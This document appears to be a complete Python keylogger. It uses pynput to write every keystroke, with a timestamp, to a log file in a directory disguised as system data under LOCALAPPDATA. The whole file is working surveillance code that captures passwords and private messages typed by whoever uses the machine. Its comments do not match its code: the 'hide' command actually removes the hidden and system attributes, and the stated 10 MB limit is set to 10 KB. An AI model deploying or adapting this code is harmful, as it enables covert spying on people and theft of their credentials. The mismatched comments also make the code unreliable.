import time
import os
from pynput import keyboard

# maximum file size in MB to be read
MAXFILESIZE = 10 * 1024

logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
# makes and hides the directory by making is hidden and system file
os.makedirs(logPath, exist_ok=True)
os.system(f'attrib -h -s "{logPath}"')
FILENAME = logPath + r"\log.txt"

pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)

    # If Alt + Caps Lock is pressed, program terminates
    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        return False
    
    lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"
    with open(FILENAME, flag) as f:
        lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

def on_release(key):
    pressedKeys.remove(key)
    
try:    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
